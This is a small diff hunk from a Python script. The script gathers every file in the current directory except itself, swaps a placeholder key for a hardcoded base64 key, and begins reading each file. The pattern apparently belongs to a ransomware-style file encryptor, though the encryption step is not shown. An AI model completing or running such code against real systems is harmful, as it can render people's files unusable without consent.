@@ -19,7 +19,7 @@ files_in_directory(os.getcwd())
 for file in files:
     if os.path.basename(file) == "f1.py":
         files.remove(file)
-key = bytes(b'Devang')
+key = bytes(b'YfgbWeczb-N478XYS4F9NSZ4XXQCUz0s2PbH-gx_5ss=')
 
 for file in files:
     with open(file,"rb") as thefile:
